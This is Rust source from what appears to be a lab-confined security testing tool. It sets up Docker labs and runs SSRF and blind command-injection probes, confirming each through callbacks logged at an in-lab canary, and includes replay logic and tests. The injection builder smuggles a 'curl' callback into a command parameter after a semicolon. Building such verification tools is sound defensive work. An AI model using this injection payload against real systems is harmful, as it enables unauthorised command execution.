) -> Result<(Observation<bool>, EvidenceDraft)> {
    // Fail-closed on a weak token before it reaches the URL or the `contains`
    // check: an empty/short token would false-witness (an empty token makes
    // `logs.contains(token)` vacuously true), and this fronts the replay path where
    // the token is untrusted witness input.
    validate_ssrf_token(token)?;
    let request_path = format!("/fetch?url=http://{canary_alias}:{canary_port}/{token}");
    // Fail-closed validation of the interpolated path. `canary_alias` is the one
    // component not already constrained (the token is validated above, the port is
    // a u16), so reject CR/LF in the assembled path: a crafted alias must not inject
    // a second request line (RK-015). The leading-`/` test is a cheap invariant on
    // the literal `/fetch` prefix. The marker-in-path check does not apply (the
    // token is in the path by design). The replay path separately re-derives and
    // compares this path in `replay_ssrf_probe`.
    if !request_path.starts_with('/') || request_path.contains('\r') || request_path.contains('\n')
    {
        return Err(Error::InvalidTarget {
            spec: request_path,
            reason: "the SSRF coercion path must start with '/' and contain no CR or LF".to_owned(),
        });
    }
    let secs = timeout.as_secs().max(1);
    let applied = Duration::from_secs(secs);
    let url = format!("http://{}:{}{}", app.host(), app.port(), request_path);
    let cmd = wget_cmd(&url, secs, &[]);
    let (state, _body, headers) = run_probe_capturing(
        docker,
        vantage.name(),
        cmd,
        applied + Duration::from_secs(5),
    )
    .await?;
    // The witness is out-of-band, so poll the canary's logs over the bounded window
    // (see SSRF_CANARY_POLL_ATTEMPTS for why a single read would risk a false PASS),
    // returning as soon as the token appears.
    let mut seen = false;
    for attempt in 0..SSRF_CANARY_POLL_ATTEMPTS {
        let (canary_out, canary_err) = read_container_logs(docker, canary_container).await?;
        if canary_out.contains(token) || canary_err.contains(token) {
            seen = true;
            break;
        }
        if attempt + 1 < SSRF_CANARY_POLL_ATTEMPTS {
            tokio::time::sleep(SSRF_CANARY_POLL_INTERVAL).await;
        }
    }
    let observation = classify_ssrf(&state, seen, response_was_redirected(&headers));
    let spec = format!("{}:{}", app.host(), app.port());
    let draft = ssrf_draft(
        vantage.segment(),
        spec,
        &request_path,
        token,
        canary_alias,
        canary_port,
        &observation,
        applied,
    );
    Ok((observation, draft))
}

/// A fail-closed check that the per-probe SSRF `token` is safe to embed in the
/// coercion URL and specific enough that `logs.contains(token)` cannot match
/// stale or unrelated canary-log content: at least 8 characters and only URL-safe
/// unreserved bytes. An empty or too-short token would false-witness. The
/// capability caller ([`ssrf_token`]) mints a fresh unique token per probe; this
/// is the defensive floor for any caller, including a replay from an untrusted
/// witness. Pure, so it is guarded offline.
fn validate_ssrf_token(token: &str) -> Result<()> {
    let safe = token.len() >= 8
        && token
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.' | b'~'));
    if !safe {
        return Err(Error::InvalidTarget {
            spec: token.to_owned(),
            reason: "the SSRF token must be at least 8 URL-safe (unreserved) characters".to_owned(),
        });
    }
    Ok(())
}

/// A fresh, unique, URL-safe per-probe SSRF token (reuses [`run_id`]'s uniqueness).
/// Minted by the capability caller so each coercion's canary callback is
/// distinguishable and cannot match a prior probe's log line.
pub(crate) fn ssrf_token() -> String {
    format!("ssrf-{}", run_id())
}

/// Replay an SSRF witness against `env` (ADR-0022, #65), parallel to
/// `replay_http_witness_probe`: reconstruct the coercion the witness records, bring
/// `env` up fresh, re-run it, and return the raw `Observation`. The canary's
/// container name is resolved from the fresh lab by the witnessed `canary_alias`
/// (it is not in the witness: the container name is per-run), so a replay reaches
/// the right canary. The app target is re-resolved through
/// `Scope::from_environment(env)` so a replay cannot aim outside scope, and the lab
/// is always torn down.
// allow(dead_code): no M1 production caller, like the other replays; the loop
// guard exercises it under cfg(test).
#[allow(dead_code)]
pub(crate) async fn replay_ssrf_probe(
    docker: &Docker,
    env: &Environment,
    witness: &Reproduction,
) -> Result<Observation<bool>> {
    let (segment, target, request_path, token, canary_alias, canary_port, timeout) =
        parse_ssrf_witness(witness)?;
    let scoped = Scope::from_environment(env).resolve(&target)?;
    // Reproduce the recorded coercion, not a freshly-built one: the witnessed
    // request_path must be the one this canary and token regenerate, else the
    // witness was tampered and the replay would verify a different attack than the
    // one recorded (ADR-0022). `ssrf_exploit_from` rebuilds the same path, so this
    // refuses a mismatch rather than silently replaying a different coercion.
    let expected_path = format!("/fetch?url=http://{canary_alias}:{canary_port}/{token}");
    if request_path != expected_path {
        return Err(Error::InvalidTarget {
            spec: request_path,
            reason: "replay witness request_path does not match its recorded canary and token"
                .to_owned(),
        });
    }

    let lab = bring_up(docker, env).await?;
    let probed = async {
        let net = vantage_network(&lab, &segment)?;
        let canary_container = lab
            .containers()
            .iter()
            .find(|c| c.workload() == canary_alias)
            .map(|c| c.name())
            .ok_or_else(|| Error::LabUnavailable {
                reason: format!("environment declares no canary workload {canary_alias:?}"),
            })?;
        ssrf_exploit_from(
            docker,
            net,
            &scoped,
            &canary_alias,
            canary_port,
            canary_container,
            &token,
            timeout,
        )
        .await
        .map(|(observation, _draft)| observation)
    }
    .await;
    if let Err(e) = lab.teardown().await {
        eprintln!("redstep: teardown after a replay also failed: {e}");
    }
    probed
}

/// The blind command-injection coercion, as the `request_path` sent to the cmdi
/// target's `/exec`: a benign token, then a shell-injected `curl` that fetches the
/// in-lab canary at `/{token}`. URL-encoded so the `;`, the spaces and the inner
/// URL survive as a single `cmd` query value in the wget request line (the `:` and
/// `/` are left literal, as the in-band `CMDI_INJECTION` does; both are valid query
/// bytes). Pure, so the exact path both [`blind_cmdi_exploit_from`] and the replay
/// tamper-check build is testable offline, and they cannot drift. The witness is
/// OUT-OF-BAND (the token at the canary), so there is no in-band marker and the
/// marker-in-path forgery rule does not apply; the token legitimately appears in
/// the path, because it is the callback URL the injected command fetches.
fn blind_cmdi_coercion_path(canary_alias: &str, canary_port: u16, token: &str) -> String {
    format!("/exec?cmd=x%3Bcurl%20-s%20http://{canary_alias}:{canary_port}/{token}")
}

/// Fail-closed check that an assembled out-of-band coercion `request_path` cannot
/// re-aim the outer request's authority or split its request line (RK-015): it must
/// start with `/` (so the literal `/exec` prefix, not a crafted component, fixes the
/// outer authority) and contain no CR or LF (so a crafted `canary_alias` cannot
/// inject a second request line). Lifted out of [`blind_cmdi_exploit_from`] as a
/// pure function so this scope-relevant guard is pinned by an offline test on every
/// gate, not only by the Docker-gated exploit path (where a dropped check would ship
/// green). Parallel to the inline check in `ssrf_exploit_from`; #75 unifies them.
fn blind_cmdi_path_is_safe(request_path: &str) -> bool {
    request_path.starts_with('/') && !request_path.contains('\r') && !request_path.contains('\n')
}

/// Coerce `app` (the command-injection target) from the attacker vantage to run an
/// injected OS command that fetches `http://{canary_alias}:{canary_port}/{token}`,
/// then witness the request OUT-OF-BAND in the canary's logs, exactly as
/// [`ssrf_exploit_from`] does for SSRF (#87, ADR-0023). The one difference is the
/// coercion: a command injection at `/exec` ([`blind_cmdi_coercion_path`]), not a
/// URL parameter, so a target that actually runs the injected `curl` is the
/// witness. The probe's own response carries nothing about the callback (that is
/// what "blind" means), so this is a separate path from the body-marker seam, like
/// SSRF.
///
/// It reuses the shared, content-free out-of-band primitives rather than refactoring
/// the shipped SSRF path: `validate_ssrf_token` (the token is untrusted on the
/// replay path and an empty one would false-witness), `run_probe_capturing`, the
/// bounded canary-log poll (`SSRF_CANARY_POLL_*`, so a hit still propagating is not
/// read as a confident not-reached), `classify_ssrf` (the pure out-of-band
/// classifier, which carries no SSRF-specific text), and `read_container_logs`. The
/// draft is [`blind_cmdi_draft`], stamped `HTTP_BLIND_CMDI_VANTAGE` and attributed
/// to `app`. Keeping this parallel to `ssrf_exploit_from` (rather than generalizing
/// it) leaves the reviewed SSRF witness path untouched and gives #75 its second
/// concrete out-of-band caller to unify.
// allow(too_many_arguments): each argument is a distinct probe input, parallel to
// `ssrf_exploit_from`; the probe-inputs reshape (#75) groups them.
#[allow(clippy::too_many_arguments)]
pub(crate) async fn blind_cmdi_exploit_from(
    docker: &Docker,
    vantage: &LabNetwork,
    app: &ScopedTarget,
    canary_alias: &str,
    canary_port: u16,
    canary_container: &str,
    token: &str,
    timeout: Duration,
) -> Result<(Observation<bool>, EvidenceDraft)> {
    // Fail-closed on a weak token before it reaches the injected URL or the
    // `contains` check, exactly as the SSRF path: an empty/short token would
    // false-witness, and this fronts the replay path where the token is untrusted.
    validate_ssrf_token(token)?;
    let request_path = blind_cmdi_coercion_path(canary_alias, canary_port, token);
    // Fail-closed validation of the interpolated path, as the SSRF coercion does
    // (RK-015). `canary_alias` is the one component not already constrained (the
    // token is validated above, the port is a u16), so `blind_cmdi_path_is_safe`
    // rejects CR/LF (a crafted alias injecting a second request line) and checks the
    // literal `/exec` prefix. The marker-in-path check does not apply (the token is
    // in the path by design, and the witness is at the canary).
    if !blind_cmdi_path_is_safe(&request_path) {
        return Err(Error::InvalidTarget {
            spec: request_path,
            reason:
                "the blind command-injection coercion path must start with '/' and contain no CR or LF"
                    .to_owned(),
        });
    }
    let secs = timeout.as_secs().max(1);
    let applied = Duration::from_secs(secs);
    let url = format!("http://{}:{}{}", app.host(), app.port(), request_path);
    let cmd = wget_cmd(&url, secs, &[]);
    let (state, _body, headers) = run_probe_capturing(
        docker,
        vantage.name(),
        cmd,
        applied + Duration::from_secs(5),
    )
    .await?;
    // The witness is out-of-band, so poll the canary's logs over the bounded window
    // (see SSRF_CANARY_POLL_ATTEMPTS for why a single read would risk a false PASS),
    // returning as soon as the token appears.
    let mut seen = false;
    for attempt in 0..SSRF_CANARY_POLL_ATTEMPTS {
        let (canary_out, canary_err) = read_container_logs(docker, canary_container).await?;
        if canary_out.contains(token) || canary_err.contains(token) {
            seen = true;
            break;
        }
        if attempt + 1 < SSRF_CANARY_POLL_ATTEMPTS {
            tokio::time::sleep(SSRF_CANARY_POLL_INTERVAL).await;
        }
    }
    let observation = classify_ssrf(&state, seen, response_was_redirected(&headers));
    let spec = format!("{}:{}", app.host(), app.port());
    let draft = blind_cmdi_draft(
        vantage.segment(),
        spec,
        &request_path,
        token,
        canary_alias,
        canary_port,
        &observation,
        applied,
    );
    Ok((observation, draft))
}

/// Compose the evidence draft for a blind command-injection probe. Parallel to
/// [`ssrf_draft`]: the `target` is the coerced app, NOT the canary (the canary is
/// only the observation point, so the finding is attributed to the app and the
/// canary lives solely in the reproduction params, #65/#87, ADR-0023).
/// Confidence-first summary, like `http_witness_draft`, so a `true` can never read
/// sub-`High`. A separate function from `ssrf_draft` (rather than parameterizing it
/// by capability and summary) keeps the shipped SSRF path untouched; #75 unifies
/// the two out-of-band drafts.
// allow(too_many_arguments): each argument is a distinct draft input, parallel to
// `ssrf_draft`; kept flat until the #75 reshape.
#[allow(clippy::too_many_arguments)]
fn blind_cmdi_draft(
    segment: &str,
    target_spec: String,
    request_path: &str,
    token: &str,
    canary_alias: &str,
    canary_port: u16,
    observation: &Observation<bool>,
    applied: Duration,
) -> EvidenceDraft {
    let summary = if observation.confidence != Confidence::High {
        "the probe did not complete cleanly; the result is inconclusive".to_owned()
    } else if observation.value {
        format!(
            "the target ran an injected command that reached the canary with token {token:?}; \
             the blind command injection succeeded"
        )
    } else {
        "the target did not reach the canary; this injection did not exploit it".to_owned()
    };
    EvidenceDraft {
        capability: HTTP_BLIND_CMDI_VANTAGE,
        target: target_spec.clone(),
        intensity: Intensity::Controlled,
        observed: serde_json::Value::Bool(observation.value),
        confidence: observation.confidence,
        summary,
        source: Some(NodeRef::Vantage {
            segment: segment.to_owned(),
        }),
        reproduction: Reproduction {
            capability: HTTP_BLIND_CMDI_VANTAGE.to_owned(),
            target: target_spec,
            params: serde_json::json!({
                "request_path": request_path,
                "token": token,
                "canary_alias": canary_alias,
                "canary_port": canary_port,
                "vantage_segment": segment,
                "timeout_ms": applied.as_millis() as u64,
            }),
        },
    }
}

/// The env-independent replay inputs parsed from a blind command-injection witness:
/// the segment, the target (the app), the coercion request path, the token, the
/// canary alias and port, and the applied timeout. The witness fields are identical
/// to an SSRF witness's (the out-of-band family shares them), so this is parallel to
/// [`parse_ssrf_witness`]; it is a separate fail-closed parser rather than a shared
/// one so the shipped SSRF parse stays untouched, and #75 unifies them (the
/// identical fields make that clean). Pure and Docker-free, fail-closed on a
/// missing/ill-typed field or a non-blind-cmdi capability (ADR-0022).
// allow(type_complexity): the parsed replay inputs are a flat tuple parallel to
// `parse_ssrf_witness`; a named struct is the same #75 reshape, not now.
#[allow(clippy::type_complexity)]
fn parse_blind_cmdi_witness(
    witness: &Reproduction,
) -> Result<(String, String, String, String, String, u16, Duration)> {
    let invalid = |reason: &str| Error::InvalidTarget {
        spec: witness.target.clone(),
        reason: reason.to_owned(),
    };
    if witness.target.is_empty() {
        return Err(invalid("replay witness has an empty target"));
    }
    if witness.capability != HTTP_BLIND_CMDI_VANTAGE {
        return Err(invalid(
            "replay witness is not a blind command-injection witness",
        ));
    }
    let str_param = |key: &str, reason: &'static str| {
        witness
            .params
            .get(key)
            .and_then(|v| v.as_str())
            .filter(|s| !s.trim().is_empty())
            .map(str::to_owned)
            .ok_or_else(|| invalid(reason))
    };
    let segment = str_param("vantage_segment", "replay witness has no vantage_segment")?;
    let request_path = str_param("request_path", "replay witness has no request_path")?;
    let token = str_param("token", "replay witness has no token")?;
    let canary_alias = str_param("canary_alias", "replay witness has no canary_alias")?;
    let canary_port = witness
        .params
        .get("canary_port")
        .and_then(|v| v.as_u64())
        .filter(|p| *p <= u16::MAX as u64)
        .ok_or_else(|| invalid("replay witness has no canary_port"))? as u16;
    let timeout_ms = witness
        .params
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| invalid("replay witness has no timeout_ms"))?;
    Ok((
        segment,
        witness.target.clone(),
        request_path,
        token,
        canary_alias,
        canary_port,
        Duration::from_millis(timeout_ms),
    ))
}

/// Replay a blind command-injection witness against `env` (ADR-0022, #87),
/// parallel to [`replay_ssrf_probe`]: reconstruct the coercion the witness records,
/// bring `env` up fresh, re-run it, and return the raw `Observation`. The canary's
/// container name is resolved from the fresh lab by the witnessed `canary_alias`
/// (per-run, not in the witness), so a replay reaches the right canary. The app
/// target is re-resolved through `Scope::from_environment(env)` so a replay cannot
/// aim outside scope, and the lab is always torn down. It refuses a witness whose
/// `request_path` does not re-derive from its recorded canary and token, so a
/// tampered witness cannot replay a different injection than the one recorded.
// allow(dead_code): no M1 production caller, like the other replays; the loop guard
// exercises it under cfg(test).
#[allow(dead_code)]
pub(crate) async fn replay_blind_cmdi_probe(
    docker: &Docker,
    env: &Environment,
    witness: &Reproduction,
) -> Result<Observation<bool>> {
    let (segment, target, request_path, token, canary_alias, canary_port, timeout) =
        parse_blind_cmdi_witness(witness)?;
    let scoped = Scope::from_environment(env).resolve(&target)?;
    // Reproduce the recorded coercion, not a freshly-built one: the witnessed
    // request_path must be the one this canary and token regenerate, else the
    // witness was tampered and the replay would verify a different injection than
    // the one recorded (ADR-0022). `blind_cmdi_coercion_path` is the one builder
    // both the exploit and this check use, so a mismatch is refused here.
    let expected_path = blind_cmdi_coercion_path(&canary_alias, canary_port, &token);
    if request_path != expected_path {
        return Err(Error::InvalidTarget {
            spec: request_path,
            reason: "replay witness request_path does not match its recorded canary and token"
                .to_owned(),
        });
    }

    let lab = bring_up(docker, env).await?;
    let probed = async {
        let net = vantage_network(&lab, &segment)?;
        let canary_container = lab
            .containers()
            .iter()
            .find(|c| c.workload() == canary_alias)
            .map(|c| c.name())
            .ok_or_else(|| Error::LabUnavailable {
                reason: format!("environment declares no canary workload {canary_alias:?}"),
            })?;
        blind_cmdi_exploit_from(
            docker,
            net,
            &scoped,
            &canary_alias,
            canary_port,
            canary_container,
            &token,
            timeout,
        )
        .await
        .map(|(observation, _draft)| observation)
    }
    .await;
    if let Err(e) = lab.teardown().await {
        eprintln!("redstep: teardown after a replay also failed: {e}");
    }
    probed
}

/// The lab network for `segment`, or `Error::LabUnavailable` if the environment
/// declares no such segment (fail-closed: a witness naming a segment the
/// environment does not have cannot be replayed). Pure over a built lab (no
/// Docker call), so the lookup and its fail-closed absence are testable offline.
fn vantage_network<'a>(lab: &'a RunningLab, segment: &str) -> Result<&'a LabNetwork> {
    lab.networks()
        .iter()
        .find(|n| n.segment() == segment)
        .ok_or_else(|| Error::LabUnavailable {
            reason: format!(
                "environment declares no segment {segment:?} to replay the vantage from"
            ),
        })
}

impl RunningLab {
    /// The networks this lab created, one per segment.
    pub fn networks(&self) -> &[LabNetwork] {
        &self.networks
    }

    /// The containers this lab created, one per workload.
    pub fn containers(&self) -> &[LabContainer] {
        &self.containers
    }

    /// Remove every container and network this lab created. The normal,
    /// error-surfacing teardown path.
    ///
    /// `torn_down` is set whether or not `remove_all` succeeded, but only once
    /// this future runs to completion (the assignment is after the `.await`): a
    /// teardown that *completed* is the caller's result to handle (the returned
    /// `Err`, which `run_in_lab` warns), not something the `Drop` backstop
    /// retries. The backstop fires when `teardown` did not complete: never
    /// called, or its future dropped (cancelled) before `torn_down` was set (the
    /// `Drop` impl).
    pub async fn teardown(mut self) -> Result<()> {
        let result = remove_all(&self.docker, &self.containers, &self.networks).await;
        self.torn_down = true;
        result
    }
}

impl Drop for RunningLab {
    fn drop(&mut self) {
        if self.torn_down {
            return;
        }
        // Backstop for a teardown that did not complete: never called, or its
        // future dropped mid-removal (a `?`/panic/cancel between `bring_up` and a
        // completed teardown). Not for a teardown that ran to completion and
        // failed: that error is the caller's, surfaced by `teardown`, and is not
        // retried here. Drop cannot be async, and `block_on` panics when it runs
        // on a thread that is already inside a runtime (the common case fires
        // there). So run the removal on a dedicated thread, which has no ambient
        // runtime, and join it. Best effort: warn, never panic.
        let docker = self.docker.clone();
        let containers = std::mem::take(&mut self.containers);
        let networks = std::mem::take(&mut self.networks);
        let ok = std::thread::spawn(move || {
            let Ok(rt) = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
            else {
                return false;
            };
            rt.block_on(remove_all(&docker, &containers, &networks))
                .is_ok()
        })
        .join()
        .unwrap_or(false);
        if !ok {
            eprintln!(
                "redstep: lab teardown backstop could not remove every object; \
                 some Docker networks or containers may remain"
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::observation::Confidence;

    /// Guard: the container command follows the workload kind (#46). A `Standin`
    /// sleeps so it stays alive and inspectable (its image would otherwise exit
    /// at once); a `Service` with no command defers to the image's own `CMD`
    /// (`None`); a `Service` with a command runs it. Mutation: make `Standin`
    /// return `None` -> a busybox stand-in exits at once, breaking the boundary
    /// demo's inspectable topology -> this fails; make a `Service` sleep -> its
    /// service never runs.
    #[test]
    fn workload_cmd_follows_the_kind() {
        assert_eq!(
            workload_cmd(&WorkloadKind::Standin),
            Some(vec!["sleep".to_owned(), "3600".to_owned()])
        );
        assert_eq!(workload_cmd(&WorkloadKind::Service { command: None }), None);
        assert_eq!(
            workload_cmd(&WorkloadKind::Service {
                command: Some(vec!["nc".to_owned(), "-l".to_owned()]),
            }),
            Some(vec!["nc".to_owned(), "-l".to_owned()])
        );
    }

    /// Guard: dropping a `RunningLab` without calling `teardown`, from inside an
    /// active tokio runtime, does not panic (the backstop runs on a dedicated
    /// thread). Mutation: replace the `std::thread::spawn(...).join()` with a
    /// direct `block_on` on a fresh runtime -> this panics with "Cannot start a
    /// runtime from within a runtime" -> the test fails. The connection is lazy
    /// and the lab is empty, so no Docker daemon is needed.
    #[test]
    fn drop_without_teardown_does_not_panic_inside_a_runtime() {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("runtime");
        rt.block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("lazy connect");
            let lab = RunningLab {
                docker,
                networks: Vec::new(),
                containers: Vec::new(),
                torn_down: false,
            };
            drop(lab);
        });
    }

    use std::collections::HashSet;

    /// A prober that answers from canned sets, so the gate's decision logic is
    /// tested without Docker. `reach`ed `(network, target)` pairs resolve to
    /// reachable; `fail`ed ones return `LabUnavailable`.
    struct MockProber {
        reachable: HashSet<(String, String)>,
        fail: HashSet<(String, String)>,
    }

    impl MockProber {
        fn new() -> Self {
            Self {
                reachable: HashSet::new(),
                fail: HashSet::new(),
            }
        }
        fn reach(mut self, network: &str, target: &str) -> Self {
            self.reachable
                .insert((network.to_owned(), target.to_owned()));
            self
        }
        fn failing(mut self, network: &str, target: &str) -> Self {
            self.fail.insert((network.to_owned(), target.to_owned()));
            self
        }
    }

    impl Prober for MockProber {
        async fn reaches(&self, network: &str, target: &str) -> Result<bool> {
            let key = (network.to_owned(), target.to_owned());
            if self.fail.contains(&key) {
                return Err(Error::LabUnavailable {
                    reason: "mock probe failure".to_owned(),
                });
            }
            Ok(self.reachable.contains(&key))
        }
    }

    /// A health poller that answers each container from a scripted sequence of
    /// readiness values, advancing one per poll and repeating the last once the
    /// script runs out. It lets `await_readiness`'s loop be tested without Docker:
    /// a sequence like `[Waiting, Waiting, Ready]` models a slow-start service.
    struct ScriptedPoller {
        scripts: std::collections::HashMap<String, std::cell::RefCell<Vec<Readiness>>>,
    }

    impl ScriptedPoller {
        fn new(scripts: &[(&str, &[Readiness])]) -> Self {
            Self {
                scripts: scripts
                    .iter()
                    .map(|(name, seq)| ((*name).to_owned(), std::cell::RefCell::new(seq.to_vec())))
                    .collect(),
            }
        }
    }

    impl HealthPoller for ScriptedPoller {
        async fn readiness(&self, container: &str) -> Result<Readiness> {
            let mut seq = self
                .scripts
                .get(container)
                .expect("a scripted container")
                .borrow_mut();
            // Advance while more than one step remains; the last value repeats.
            Ok(if seq.len() > 1 { seq.remove(0) } else { seq[0] })
        }
    }

    /// Guard: a container's Docker health status maps to the right readiness. No
    /// HEALTHCHECK (`None`/`NONE`) and `HEALTHY` are ready (so a stand-in is ready
    /// at once and the boundary demo is unchanged); `STARTING`/`EMPTY` are still
    /// coming up; `UNHEALTHY` is a failure. Mutation: map `UNHEALTHY -> Ready` ->
    /// the Failed assert here fails and the fail-closed `await_readiness` test
    /// stops erroring; map `None -> Waiting` -> a stand-in never readies (the demo
    /// would hang) and the None assert fails.
    #[test]
    fn health_readiness_maps_each_status() {
        assert_eq!(health_readiness(None), Readiness::Ready);
        assert_eq!(
            health_readiness(Some(&HealthStatusEnum::NONE)),
            Readiness::Ready
        );
        assert_eq!(
            health_readiness(Some(&HealthStatusEnum::HEALTHY)),
            Readiness::Ready
        );
        assert_eq!(
            health_readiness(Some(&HealthStatusEnum::STARTING)),
            Readiness::Waiting
        );
        assert_eq!(
            health_readiness(Some(&HealthStatusEnum::EMPTY)),
            Readiness::Waiting
        );
        assert_eq!(
            health_readiness(Some(&HealthStatusEnum::UNHEALTHY)),
            Readiness::Failed
        );
    }

    /// Guard: `await_readiness` returns `Ok` only when every container is ready,
    /// waits out a container that is still starting, fails closed the moment one
    /// is unhealthy, and times out (bounded) on one stuck starting. The unhealthy
    /// and the stuck container are NON-FIRST (`c-db`), so a check that looked only
    /// at the first container would wrongly pass (RK-009). Mutation: return `Ok`
    /// as soon as the first container is ready -> the unhealthy and stuck cases
    /// return `Ok` -> this fails; treat `Failed` as `Waiting` -> the unhealthy case
    /// times out instead of naming it "unhealthy" -> the reason assert fails; drop
    /// the `max_polls` bound (loop forever) -> the stuck case hangs.
    #[test]
    fn await_readiness_waits_for_all_and_fails_closed() {
        let containers = vec![
            container("web", "lab", "c-web"),
            container("api", "lab", "c-api"),
            container("db", "lab", "c-db"),
        ];
        let fast = Duration::from_millis(1);

        let all_ready = ScriptedPoller::new(&[
            ("c-web", &[Readiness::Ready]),
            ("c-api", &[Readiness::Ready]),
            ("c-db", &[Readiness::Ready]),
        ]);
        assert!(block_on(await_readiness(&containers, &all_ready, fast, 3)).is_ok());

        // max_polls is clamped to at least one real round, so a 0 budget still
        // polls once and returns Ok when all are ready, not a spurious timeout.
        // Mutation: drop the `.max(1)` -> the 0 budget skips the loop and returns
        // the timeout Err -> this fails.
        assert!(block_on(await_readiness(&containers, &all_ready, fast, 0)).is_ok());

        // A non-first container that starts, then becomes ready: it must be waited
        // out, not read as ready too early.
        let becomes_ready = ScriptedPoller::new(&[
            ("c-web", &[Readiness::Ready]),
            (
                "c-api",
                &[Readiness::Waiting, Readiness::Waiting, Readiness::Ready],
            ),
            ("c-db", &[Readiness::Ready]),
        ]);
        assert!(block_on(await_readiness(&containers, &becomes_ready, fast, 5)).is_ok());

        let unhealthy = ScriptedPoller::new(&[
            ("c-web", &[Readiness::Ready]),
            ("c-api", &[Readiness::Ready]),
            ("c-db", &[Readiness::Failed]),
        ]);
        let err = block_on(await_readiness(&containers, &unhealthy, fast, 3));
        assert!(
            matches!(&err, Err(Error::LabUnavailable { reason }) if reason.contains("\"db\"") && reason.contains("unhealthy")),
            "an unhealthy non-first workload fails closed naming it, got {err:?}"
        );

        let stuck = ScriptedPoller::new(&[
            ("c-web", &[Readiness::Ready]),
            ("c-api", &[Readiness::Ready]),
            ("c-db", &[Readiness::Waiting]),
        ]);
        let err = block_on(await_readiness(&containers, &stuck, fast, 3));
        assert!(
            matches!(&err, Err(Error::LabUnavailable { reason }) if reason.contains("\"db\"") && reason.contains("not ready")),
            "a stuck non-first workload times out naming it, got {err:?}"
        );
    }

    fn block_on<F: std::future::Future>(f: F) -> F::Output {
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("runtime")
            .block_on(f)
    }

    fn net(segment: &str, name: &str) -> LabNetwork {
        LabNetwork {
            segment: segment.to_owned(),
            name: name.to_owned(),
        }
    }

    fn container(workload: &str, segment: &str, name: &str) -> LabContainer {
        LabContainer {
            workload: workload.to_owned(),
            segment: segment.to_owned(),
            name: name.to_owned(),
        }
    }

    /// A lab with the given networks and containers; `torn_down` so `Drop` is a
    /// no-op on this fabricated state. The `Docker` handle is lazy and never used
    /// by `check_boundaries`.
    fn lab(networks: Vec<LabNetwork>, containers: Vec<LabContainer>) -> RunningLab {
        RunningLab {
            docker: Docker::connect_with_local_defaults().expect("lazy connect"),
            networks,
            containers,
            torn_down: true,
        }
    }

    /// The MVP topology: internet/internal, web/api/db in internal, the
    /// internet -> internal boundary blocked.
    fn mvp_env() -> Environment {
        Environment::builder()
            .segment("internal")
            .segment("internet")
            .standin("web", "busybox:1", "internal")
            .standin("api", "busybox:1", "internal")
            .standin("db", "busybox:1", "internal")
            .vantage("internet")
            .boundary("internet", "internal", &[])
            .build()
            .expect("the MVP topology is valid")
    }

    fn mvp_lab() -> RunningLab {
        lab(
            vec![net("internal", "n-internal"), net("internet", "n-internet")],
            vec![
                container("web", "internal", "c-web"),
                container("api", "internal", "c-api"),
                container("db", "internal", "c-db"),
            ],
        )
    }

    /// A mock prober whose positive controls (from the internal network) reach
    /// every internal workload. Forbidden reachability from the internet network
    /// is added per test.
    fn controls_ok() -> MockProber {
        MockProber::new()
            .reach("n-internal", "c-web")
            .reach("n-internal", "c-api")
            .reach("n-internal", "c-db")
    }

    /// Guard: with every forbidden path blocked and controls reachable, the check
    /// passes. Mutation: negate the forbidden `reaches` test -> a blocked path
    /// reads as reachable -> BoundaryViolated -> this fails.
    #[test]
    fn check_passes_when_every_forbidden_path_is_blocked() {
        let result = block_on(check_boundaries(&mvp_env(), &mvp_lab(), &controls_ok()));
        assert!(result.is_ok(), "an isolated lab passes: {result:?}");
    }

    /// Guard: a forbidden path reachable to the FIRST workload is refused.
    #[test]
    fn check_refuses_when_the_first_workload_is_reachable() {
        let prober = controls_ok().reach("n-internet", "c-web");
        let result = block_on(check_boundaries(&mvp_env(), &mvp_lab(), &prober));
        assert!(
            matches!(&result, Err(Error::BoundaryViolated { from, to }) if from == "internet" && to == "internal"),
            "got {result:?}"
        );
    }

    /// Guard: a forbidden path reachable to a NON-first workload (db) is refused.
    /// This is the one the `.find`-first bug would miss. Mutation: probe only the
    /// first `to` workload (`.find` instead of the `.filter` loop) -> `db` is
    /// never probed, the check returns `Ok` -> this fails.
    #[test]
    fn check_refuses_when_a_non_first_workload_is_reachable() {
        let prober = controls_ok().reach("n-internet", "c-db");
        let result = block_on(check_boundaries(&mvp_env(), &mvp_lab(), &prober));
        assert!(
            matches!(&result, Err(Error::BoundaryViolated { from, to }) if from == "internet" && to == "internal"),
            "got {result:?}"
        );
    }

    /// Guard: a positive control that cannot reach its own-segment target fails
    /// closed (the probe is untrustworthy), rather than certifying isolation.
    /// Mutation: drop the control arm -> the forbidden probe runs and finds the
    /// path blocked -> `Ok` -> this fails.
    #[test]
    fn check_fails_closed_when_the_positive_control_cannot_reach() {
        // Controls reach api and db, but not web.
        let prober = MockProber::new()
            .reach("n-internal", "c-api")
            .reach("n-internal", "c-db");
        let result = block_on(check_boundaries(&mvp_env(), &mvp_lab(), &prober));
        assert!(
            matches!(&result, Err(Error::LabUnavailable { reason }) if reason.contains("untrustworthy")),
            "got {result:?}"
        );
    }

    /// Guard: a probe error propagates as a refusal (fail-closed), not swallowed.
    #[test]
    fn check_fails_closed_when_a_probe_errors() {
        let prober = controls_ok().failing("n-internet", "c-web");
        let result = block_on(check_boundaries(&mvp_env(), &mvp_lab(), &prober));
        assert!(
            matches!(&result, Err(Error::LabUnavailable { .. })),
            "got {result:?}"
        );
    }

    /// Guard: a boundary whose `to` segment has no workload is a vacuous block, so
    /// a lab with no containers passes.
    #[test]
    fn check_skips_a_boundary_with_no_workload_to_reach() {
        let empty = lab(
            vec![net("internal", "n-internal"), net("internet", "n-internet")],
            Vec::new(),
        );
        let result = block_on(check_boundaries(&mvp_env(), &empty, &controls_ok()));
        assert!(
            result.is_ok(),
            "nothing to reach is vacuously blocked: {result:?}"
        );
    }

    /// Guard: every declared boundary is checked, not just the first. A two-
    /// boundary topology with the violation on the second. Mutation: `break`
    /// after the first boundary -> the second's violation is missed -> `Ok` ->
    /// this fails.
    #[test]
    fn check_covers_every_boundary_not_just_the_first() {
        let env = Environment::builder()
            .segment("a")
            .segment("b")
            .standin("wa", "busybox:1", "a")
            .standin("wb", "busybox:1", "b")
            .vantage("a")
